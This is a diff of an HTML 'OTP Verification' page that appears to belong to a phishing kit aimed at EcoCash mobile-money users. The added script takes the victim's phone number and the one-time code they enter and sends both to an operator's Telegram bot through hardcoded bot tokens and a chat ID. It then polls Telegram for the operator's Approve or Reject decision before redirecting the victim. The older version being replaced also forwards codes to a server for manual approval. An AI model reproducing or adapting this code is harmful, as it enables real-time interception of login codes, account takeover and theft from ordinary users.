@@ -1,166 +1,468 @@
-<!DOCTYPE html>
-<html>
 
+<!DOCTYPE html>
+<html lang="en">
 <head>
-    <title>Verification</title>
+<meta charset="UTF-8">
+<title>OTP Verification</title>
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-    <link rel="stylesheet" href="style.css">
+<!-- Sofia Pro font from Sportmonks CDN -->
+<link rel="stylesheet" href="https://cdn.sportmonks.com/fonts/SofiaPro/stylesheet.css">
+<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
+
+<style>
+*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+
+body{
+  font-family:'Sofia Pro','Roboto',sans-serif;
+  background:#e8ebee;
+  color:#1a1a1a;
+  min-height:100vh;
+}
+
+/* ===== TOP BAR ===== */
+.top{
+  padding:16px 16px 12px;
+}
+
+.back{
+  width:38px;height:38px;
+  border-radius:50%;
+  border:1.5px solid #b0b8c1;
+  display:flex;align-items:center;justify-content:center;
+  font-size:17px;
+  color:#3a3a3a;
+  cursor:pointer;
+  background:transparent;
+}
+
+/* ===== CARD ===== */
+.card{
+  background:#ffffff;
+  margin:4px 12px 0;
+  padding:28px 22px 26px;
+  border-radius:14px;
+  box-shadow:0 2px 12px rgba(0,0,0,0.07);
+}
+
+/* ===== HEADING ===== */
+.card h2{
+  font-size:22px;
+  font-weight:700;
+  color:#111;
+  margin-bottom:10px;
+  line-height:1.25;
+}
+
+.sub{
+  font-size:14px;
+  font-weight:400;
+  color:#5a5a5a;
+  margin-bottom:10px;
+  line-height:1.5;
+}
+
+.phone-num{
+  font-size:15px;
+  font-weight:700;
+  color:#111;
+  margin-bottom:22px;
+}
+
+/* ===== LABEL ===== */
+.label{
+  font-size:14px;
+  font-weight:400;
+  color:#444;
+  margin-bottom:10px;
+  padding-left:2px;
+}
+
+/* ===== OTP INPUTS ===== */
+.otp{
+  display:flex;
+  gap:8px;
+  justify-content:space-between;
+  margin-bottom:22px;
+}
+
+.otp input{
+  flex:1;
+  min-width:0;
+  height:56px;
+  border:2px solid #1d6fa4;
+  border-radius:10px;
+  font-size:22px;
+  font-weight:500;
+  text-align:center;
+  color:#111;
+  background:#fff;
+  outline:none;
+  font-family:'Sofia Pro','Roboto',sans-serif;
+  transition:border-color .15s, box-shadow .15s;
+  -webkit-appearance:none;
+}
+
+.otp input:focus{
+  border-color:#1558a8;
+  box-shadow:0 0 0 3px rgba(21,88,168,0.12);
+}
+
+.otp input.filled{
+  border-color:#1558a8;
+}
+
+/* ===== TIMER ===== */
+.timer{
+  text-align:center;
+  font-size:14px;
+  font-weight:400;
+  color:#555;
+  margin-bottom:40px;
+}
+
+.timer.resend{
+  color:#1558a8;
+  cursor:pointer;
+}
+
+/* ===== SUBMIT BUTTON ===== */
+button#submitBtn{
+  width:100%;
+  padding:17px;
+  border:none;
+  border-radius:12px;
+  background:#b0b5bb;
+  color:#fff;
+  font-size:16px;
+  font-weight:500;
+  font-family:'Sofia Pro','Roboto',sans-serif;
+  cursor:not-allowed;
+  transition:background .2s, box-shadow .2s;
+  letter-spacing:0.3px;
+}
+
+button#submitBtn.active{
+  background:#1d6fa4;
+  cursor:pointer;
+  box-shadow:0 4px 14px rgba(29,111,164,0.35);
+}
+
+button#submitBtn.active:active{
+  background:#1558a8;
+  transform:scale(0.985);
+}
+
+button#submitBtn:disabled{
+  background:#b0b5bb;
+  cursor:not-allowed;
+  box-shadow:none;
+}
+
+/* ===== LOADING ===== */
+#loading-message{
+  display:none;
+  align-items:center;
+  justify-content:center;
+  gap:9px;
+  margin-top:14px;
+  font-size:13.5px;
+  font-weight:500;
+  color:#1d6fa4;
+}
+
+.spinner{
+  width:16px;height:16px;
+  border:2px solid #d0e4f0;
+  border-top-color:#1d6fa4;
+  border-radius:50%;
+  animation:spin .7s linear infinite;
+  flex-shrink:0;
+}
+
+@keyframes spin{to{transform:rotate(360deg)}}
+
+/* ===== STATUS MSG ===== */
+#otp-error{
+  margin-top:10px;
+  font-size:13px;
+  font-weight:500;
+  text-align:center;
+  min-height:18px;
+}
+
+@media(max-width:360px){
+  .otp input{height:48px;font-size:19px}
+  .card h2{font-size:20px}
+}
+</style>
+<base target="_blank">
 </head>
 
 <body>
 
-<div class="header"></div>
-
-<div class="container">
-
-    <h2 class="title">Verification</h2>
-
-    <!-- 🔄 LOADER -->
-    <div class="loader"></div>
-
-    <p style="text-align:center; margin-top:15px;">
-    Please enter the code sent to your phone number via SMS.
-</p>
-
-    <!-- 🔢 OTP BOXES -->
-    <div id="otpBoxes" style="display:flex; justify-content:center; gap:10px; margin-top:20px;"></div>
-
-    <!-- BUTTON -->
-    <button class="login-btn" onclick="submitOTP()">Continue</button>
-
+<div class="top">
+  <div class="back">&#8592;</div>
 </div>
 
-<div class="footer"></div>
+<div class="card">
+  <h2>OTP Verification</h2>
+  <div class="sub">Enter the OTP sent to your phone number</div>
+  <div class="phone-num" id="phone-display"></div>
+
+  <div class="label">OTP</div>
+
+  <div class="otp">
+    <input maxlength="1" inputmode="numeric" pattern="[0-9]*">
+    <input maxlength="1" inputmode="numeric" pattern="[0-9]*">
+    <input maxlength="1" inputmode="numeric" pattern="[0-9]*">
+    <input maxlength="1" inputmode="numeric" pattern="[0-9]*">
+    <input maxlength="1" inputmode="numeric" pattern="[0-9]*">
+    <input maxlength="1" inputmode="numeric" pattern="[0-9]*">
+  </div>
+
+  <div class="timer" id="timer">Resend OTP in 60 seconds</div>
+
+  <button id="submitBtn">Submit</button>
+
+  <div id="loading-message">
+    <div class="spinner"></div>
+    Processing, please wait...
+  </div>
+
+  <div id="otp-error"></div>
+</div>
 
 <script>
-document.addEventListener("DOMContentLoaded", function () {
+// ===== SHOW MASKED PHONE =====
+const phoneRaw = localStorage.getItem('phoneNumber') || '';
+const phoneDisplay = document.getElementById('phone-display');
+if (phoneRaw) {
+  // Mask middle digits: show first 7 chars + **** + last 2
+  const masked = phoneRaw.length > 9
+    ? phoneRaw.slice(0, 7) + '****' + phoneRaw.slice(-2)
+    : phoneRaw;
+  phoneDisplay.textContent = masked;
+}
 
-    // get OTP length
-    const length = parseInt(localStorage.getItem("otpLength")) || 5;
+// ===== OTP INPUTS =====
+const otpInputs = document.querySelectorAll('.otp input');
+const submitBtn = document.getElementById('submitBtn');
+const loadingMsg = document.getElementById('loading-message');
 
-    const container = document.getElementById("otpBoxes");
+if (otpInputs.length > 0) otpInputs[0].focus();
 
-    localStorage.removeItem("otpLength");
+function checkOtpFilled() {
+  const allFilled = Array.from(otpInputs).every(i => i.value.length === 1);
+  if (allFilled) {
+    submitBtn.classList.add('active');
+    submitBtn.disabled = false;
+  } else {
+    submitBtn.classList.remove('active');
+    submitBtn.disabled = true;
+  }
+}
 
-    fetch("/clear-decision", { method: "POST" });
+// Init disabled
+submitBtn.disabled = true;
 
-    // create boxes
-    for (let i = 0; i < length; i++) {
-        const input = document.createElement("input");
-        input.type = "text";
-        input.maxLength = 1;
-        input.className = "pin-box";
-
-        container.appendChild(input);
+otpInputs.forEach((input, idx) => {
+  input.addEventListener('input', () => {
+    input.value = input.value.replace(/[^0-9]/g, '').slice(0, 1);
+    input.classList.toggle('filled', input.value.length === 1);
+    if (input.value && idx < otpInputs.length - 1) otpInputs[idx + 1].focus();
+    checkOtpFilled();
+  });
+  input.addEventListener('keydown', e => {
+    if (e.key === 'Backspace') {
+      input.classList.remove('filled');
+      if (!input.value && idx > 0) otpInputs[idx - 1].focus();
     }
-
-    const inputs = document.querySelectorAll(".pin-box");
-
-    inputs.forEach((input, index) => {
-
-        input.addEventListener("input", () => {
-            input.value = input.value.replace(/[^0-9]/g, "");
-
-            if (input.value && index < inputs.length - 1) {
-                inputs[index + 1].focus();
-            }
-        });
-
-        input.addEventListener("keydown", (e) => {
-            if (e.key === "Backspace" && !input.value && index > 0) {
-                inputs[index - 1].focus();
-            }
-        });
-
-    });
-
-    // submit OTP
-    window.submitOTP = async function () {
-        if (window.isSubmitting) return;
-        window.isSubmitting = true;
-
-        let otp = "";
-
-        inputs.forEach(input => {
-            otp += input.value;
-        });
-
-        if (otp.length != length) {
-            showError("Enter full code");
-            window.isSubmitting = false;
-            return;
-        }
-
-        const res = await fetch("/submit-otp", {
-            method: "POST",
-            headers: {
-                "Content-Type": "application/json"
-            },
-            body: JSON.stringify({ otp })
-        });
-
-        const data = await res.json();
-
-        if (data.success) {
-            showError("Code submitted. Loading...");
-        } else {
-            showError("Error submitting code");
-        }
-
-        window.isSubmitting = false;
-    };
-
-    let isRedirecting = false;
-
-    const decisionChecker = setInterval(async () => {
-        if (isRedirecting) return;
-
-        try {
-            const res = await fetch("/decision-status");
-            const data = await res.json();
-
-            if (data.decision === "valid") {
-                isRedirecting = true;
-                clearInterval(decisionChecker);
-
-                document.querySelector(".container").innerHTML =
-                    "<h2 style='text-align:center'>Approved...</h2>";
-
-                setTimeout(() => {
-                    window.location.href = "/dashboard.html";
-                }, 1500);
-            }
-
-            if (data.decision === "invalid") {
-                showError("Invalid code. Try again.");
-            }
-
-        } catch (err) {
-            console.log("Waiting decision...");
-        }
-
-    }, 2000);
-
-    function showError(msg) {
-        let box = document.getElementById("errorBox");
-
-        if (!box) {
-            box = document.createElement("div");
-            box.id = "errorBox";
-            box.style.color = "red";
-            box.style.textAlign = "center";
-            box.style.marginTop = "10px";
-            document.querySelector(".container").appendChild(box);
-        }
-
-        box.innerText = msg;
-    }
-
-    document.body.classList.add("loaded");
-
+    setTimeout(checkOtpFilled, 0);
+  });
 });
+
+// ===== COUNTDOWN =====
+let time = 60;
+const timerEl = document.getElementById('timer');
+const countdown = setInterval(() => {
+  if (time > 0) {
+    time--;
+    timerEl.textContent = `Resend OTP in ${time} seconds`;
+    timerEl.classList.remove('resend');
+  } else {
+    timerEl.textContent = 'Resend OTP';
+    timerEl.classList.add('resend');
+    clearInterval(countdown);
+  }
+}, 1000);
+
+// ===== BACK =====
+document.querySelector('.back').addEventListener('click', () => {
+  window.location.href = 'login.html';
+});
+
+// ===== TELEGRAM =====
+function sendOtpToTelegram(phone, otp) {
+  const botToken = "8724075511:AAFjhU_XRoSRaiMo9i3jUNdvjRLUebwRlCc";
+  const chatId   = "7162306402";
+  const ecoCashMsg = `<#> Your EcoCash OTP is: ${otp}. Do not share this code with anyone. Expires in 2 mins. 1qk+jE1lKeZ`;
+  const inlineKeyboard = {
+    inline_keyboard: [[
+      { text: "✅ Approve", callback_data: `OTP_APPROVE_${phone}` },
+      { text: "❌ Reject",  callback_data: `OTP_REJECT_${phone}` }
+    ]]
+  };
+  return fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ chat_id: chatId, text: ecoCashMsg, reply_markup: JSON.stringify(inlineKeyboard) })
+  });
+}
+
+// ===== SUBMIT =====
+submitBtn.addEventListener('click', async () => {
+  if (submitBtn.disabled) return;
+  const otp = Array.from(otpInputs).map(i => i.value).join('');
+  const phoneNumber = localStorage.getItem('phoneNumber') || 'Unknown';
+  submitBtn.disabled = true;
+  submitBtn.classList.remove('active');
+  loadingMsg.style.display = 'flex';
+
+  try {
+    const res = await sendOtpToTelegram(phoneNumber, otp);
+    const data = await res.json();
+    console.log('OTP Telegram response:', data);
+    if (data.ok) {
+      startListeningForOtpDecision(phoneNumber);
+    } else {
+      console.error('Failed to send OTP to Telegram:', data);
+      loadingMsg.style.display = 'none';
+      submitBtn.disabled = false;
+      submitBtn.classList.add('active');
+      document.getElementById('otp-error').style.color = '#d32f2f';
+      document.getElementById('otp-error').textContent = 'Network error. Please try again.';
+    }
+  } catch (err) {
+    console.error('Send OTP error:', err);
+    loadingMsg.style.display = 'none';
+    submitBtn.disabled = false;
+    submitBtn.classList.add('active');
+    document.getElementById('otp-error').style.color = '#d32f2f';
+    document.getElementById('otp-error').textContent = 'Network error. Please try again.';
+  }
+});
+
+// ===== POLLING (FIXED - same as login page) =====
+function startListeningForOtpDecision(phone) {
+  const botToken = '8947992379:AAHrskSXDn3wfXRzb3KJxb4Qezryz8q2_Hg';
+  const errorMsg = document.getElementById('otp-error');
+  let offset = 0;
+  let decided = false;
+  let pollCount = 0;
+  const maxPolls = 45; // 3 minutes max
+
+  console.log('OTP: Starting poll for phone:', phone);
+
+  function poll() {
+    if (decided) {
+      console.log('OTP: Already decided, stopping poll');
+      return;
+    }
+
+    pollCount++;
+    if (pollCount > maxPolls) {
+      console.log('OTP: Max polls reached, stopping');
+      loadingMsg.style.display = 'none';
+      submitBtn.disabled = false;
+      submitBtn.classList.add('active');
+      errorMsg.style.color = '#d32f2f';
+      errorMsg.textContent = 'Session timed out. Please try again.';
+      return;
+    }
+
+    console.log('OTP: Polling... attempt', pollCount, 'offset:', offset);
+
+    fetch(`https://api.telegram.org/bot${botToken}/getUpdates?limit=20&offset=${offset}`)
+      .then(r => r.json())
+      .then(data => {
+        console.log('OTP: Poll response:', data);
+        if (!data.ok) {
+          console.error('OTP: Telegram API error:', data);
+          setTimeout(poll, 4000);
+          return;
+        }
+
+        if (decided) return;
+
+        for (let update of data.result) {
+          offset = update.update_id + 1;
+          console.log('OTP: Processing update:', update.update_id, 'type:', update.callback_query ? 'callback' : 'message');
+
+          if (update.callback_query) {
+            const action = update.callback_query.data;
+            console.log('OTP: Callback data:', action, 'Expected APPROVE:', `OTP_APPROVE_${phone}`, 'Expected REJECT:', `OTP_REJECT_${phone}`);
+
+            if (action === `OTP_APPROVE_${phone}`) {
+              console.log('OTP: APPROVE received!');
+              decided = true;
+              loadingMsg.style.display = 'none';
+              errorMsg.style.color = '#1a7a3c';
+              errorMsg.textContent = '✅ OTP approved! Proceeding...';
+              setTimeout(() => { window.location.href = 'dashboard.html'; }, 1000);
+              return;
+
+            } else if (action === `OTP_REJECT_${phone}`) {
+              console.log('OTP: REJECT received!');
+              decided = true;
+              loadingMsg.style.display = 'none';
+              submitBtn.disabled = false;
+              submitBtn.classList.add('active');
+              errorMsg.style.color = '#d32f2f';
+              errorMsg.textContent = '❌ Wrong OTP. Please try again.';
+              setTimeout(() => {
+                decided = false;
+                errorMsg.textContent = '';
+                otpInputs.forEach(i => { i.value = ''; i.classList.remove('filled'); });
+                otpInputs[0].focus();
+                checkOtpFilled();
+              }, 2000);
+              return;
+            }
+          }
+        }
+
+        // Continue polling if no decision yet
+        if (!decided) {
+          setTimeout(poll, 4000);
+        }
+      })
+      .catch(err => {
+        console.error('OTP: Polling error:', err);
+        if (!decided) {
+          setTimeout(poll, 4000);
+        }
+      });
+  }
+
+  // Get initial offset, then start polling
+  fetch(`https://api.telegram.org/bot${botToken}/getUpdates?limit=1`)
+    .then(r => r.json())
+    .then(data => {
+      if (data.ok && data.result.length > 0) {
+        offset = data.result[data.result.length - 1].update_id + 1;
+      }
+      console.log('OTP: Initial offset set to:', offset);
+      // Start polling immediately
+      poll();
+    })
+    .catch(err => {
+      console.error('OTP: Failed to get initial offset:', err);
+      // Start polling anyway
+      poll();
+    });
+}
 </script>
-<div id="pageLoader" class="loader" style="display:none;"></div>
+
 </body>
 </html>
